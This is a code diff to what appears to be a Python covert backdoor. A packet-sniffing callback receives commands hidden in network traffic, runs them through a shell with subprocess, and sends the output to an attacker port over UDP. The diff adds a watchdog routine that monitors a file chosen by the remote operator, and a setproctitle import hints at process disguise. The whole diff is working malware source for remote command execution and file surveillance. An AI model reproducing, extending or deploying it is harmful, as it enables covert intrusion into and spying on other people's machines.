@@ -3,6 +3,14 @@ from crypto import *
 from config import *
 from time import sleep
 import setproctitle
+from watchdog.observers import Observer
+from watchdog.events import FileSystemEventHandler
+import os
+
+class WatchHandler(FileSystemEventHandler):
+    def on_modified(self, event):
+        if (event.is_directory == False) & (event.src_path == WATCH_FILE):
+            print("something happened")
 
 def sniff_callback(packet):
     if packet.haslayer(Raw):
@@ -18,8 +26,13 @@ def sniff_callback(packet):
         empty_packet = IP(dst=packet[IP].src) / UDP(sport=VICTIM_PORT, dport=ATTACKER_PORT)
 
         if watch_file:
-            print("watch file")
-            print command
+            global WATCH_FILE
+            WATCH_FILE = command
+            event_handler = WatchHandler()
+            observer = Observer()
+            path = os.path.split(WATCH_FILE)[0];
+            observer.schedule(event_handler, path, recursive=False)
+            observer.start()
         else:
             proc = subprocess.Popen(command, stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
             output = proc.stdout.read() + "\n" + proc.stderr.read()
